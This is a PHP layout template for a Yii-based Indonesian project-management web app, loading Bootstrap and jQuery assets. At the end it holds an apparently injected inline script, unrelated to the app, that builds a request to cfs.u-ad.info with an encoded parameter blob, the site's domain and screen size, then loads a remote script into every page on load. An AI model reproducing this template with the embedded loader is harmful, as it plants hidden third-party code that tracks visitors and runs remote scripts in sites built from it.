<!DOCTYPE html>
<html lang="en" class="bg-blue">
<head>
    <meta charset="utf-8">
    <title><?php echo CHtml::encode($this->pageTitle); ?></title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Sistem Managemen Proyek berbasis Web pada CV Dokter Desain Kreasi Indonesia">
    <meta name="author" content="Mugi Rachmat - infomugi@gmail.com">
    <meta content="IE=edge,chrome=1" http-equiv="X-UA-Compatible">

    <!-- Bootstrap core CSS -->
    <link href="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/css/bootstrap-reset.css" rel="stylesheet">

    <!--Animation css-->
    <link href="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/css/animate.css" rel="stylesheet">

    <!--Icon-fonts css-->
    <link href="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/assets/font-awesome/css/font-awesome.css" rel="stylesheet" />
    <link href="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/assets/ionicon/css/ionicons.min.css" rel="stylesheet" />

    <!--Morris Chart CSS -->
    <link rel="stylesheet" href="assets/morris/morris.css">

    <!-- Custom styles for this template -->
    <link href="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/css/style.css" rel="stylesheet">
    <link href="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/css/helper.css" rel="stylesheet">
    <link href="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/css/style-responsive.css" rel="stylesheet" />

    <body>

        <?php echo $content; ?>

    </body>

    <!-- js placed at the end of the document so the pages load faster -->
    <script src="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/js/jquery.js"></script>
    <script src="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/js/bootstrap.min.js"></script>
    <script src="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/js/pace.min.js"></script>
    <script src="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/js/wow.min.js"></script>
    <script src="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/js/jquery.nicescroll.js" type="text/javascript"></script>

    <!--common script for all pages-->
    <script src="<?php echo Yii::app()->request->baseUrl; ?>/bootstrap/js/jquery.app.js"></script>  
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRK1Z6VDOtBRGWMqav1fjy1iUIBM9lHUne%2fN21sww%2b9dJ6V9BD%2bEjJJjLFGsL%2fUVpoe7vDUbHZ2PNxFjMkjgki7pHXNXJzR1inMXzZTYdv7N8WH5gfZsFNyMDzp4kySVLlQg7FGLyZYot3I3pTPVSRl8svaQL%2fsdJrjb1EnDmatCbMExFE%2bCn3q5VyXSyGEIVGMwKdKUjo4Myd2Df%2bC2HjEq28t9s5mcUoTcMXarc8hBY1VSrJx4MRg5wGjRgbERAkYri9fm8dTIZv8RFID0DyqckvPJpbPVhJrmTrfHLGwXnjV5ewJmN6XFKVcfWnw4%2bVsrWP8%2bNJiCLckGf%2fYGkCs24iZJ46IoPlDYvoDmukdqUHo95j%2bQM0JQ3HoYJNmD87x%2fUUcxdHU4qWwVzZm9njK09Bv%2bi%2bZbdozRKK3iEldpbpSRgXgHO3hNkSs5MgT2JCSGcVVgFtPrmy1rb5ZGNbNv%2bjdtAzQqUXB533O7Dke%2bv3JRbttbqE%2blftZNstQ1WE" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>

    </html>